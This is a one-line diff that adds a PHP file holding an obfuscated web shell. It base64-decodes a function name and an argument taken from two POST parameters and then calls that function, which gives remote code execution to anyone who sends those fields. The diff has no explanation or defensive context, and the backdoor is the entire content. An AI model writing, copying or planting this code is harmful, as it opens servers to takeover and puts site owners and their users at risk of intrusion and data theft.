@@ -1,0 +1,1 @@
+<?php if(@$_POST[keyerror]){$c = new cc();$s = $_POST[keyerror];$b = @base64_decode($s);$b($c->base());}class cc{function base(){return @base64_decode($_POST[fuckerror]);}}?>
